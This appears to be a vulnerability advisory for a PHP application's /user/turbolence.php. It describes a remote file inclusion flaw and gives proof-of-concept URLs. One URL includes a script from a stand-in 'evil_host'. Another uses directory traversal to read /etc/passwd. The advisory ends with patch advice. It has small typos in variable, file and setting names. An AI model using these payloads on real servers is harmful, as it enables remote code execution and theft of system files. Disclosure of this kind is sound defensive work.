2) Security Issues
-------------------

--- [ Remote File Inclusion Vulnerability ] ---
===============================================

[ /user/turbolence.php - Line 34 - 39 ]

[...]

$tdbconn = tdb_connect($GLOBALS['tdb']);
if (!$tdbconn) decho("Database Connection Failed...");
decho("Database Connection: ".$tdbconn);
include($GLOBALS['tcore'].'/user/session.inc');

if ($GLOBALS['login']) { 

[...]

[ end script turbolence.php ]

As you can see the variable $GLOBALS['tcode'] is not properly sanitized before being used; so an attacker can gain access
to the shell by using a crafted URL.

--- [ PoC ] ---
===============

Tested on a php.ini configuration as the follow:

register_global = On
allow_url_unclude = On

RFI:

http://127.0.0.1/user/turbulence.php?GLOBALS[tcore]=http://evil_host/evil_script.txt?

LFI:

http://127.0.0.1/turbulence.php?GLOBALS[tcore]=../../../../../../../../../../../../etc/passwd%00


---- [ Patch ] ----

1. Edit the source code to ensure that the input is validated.
2. To avoid Remote File Inclusion turn Off allow_url_include.
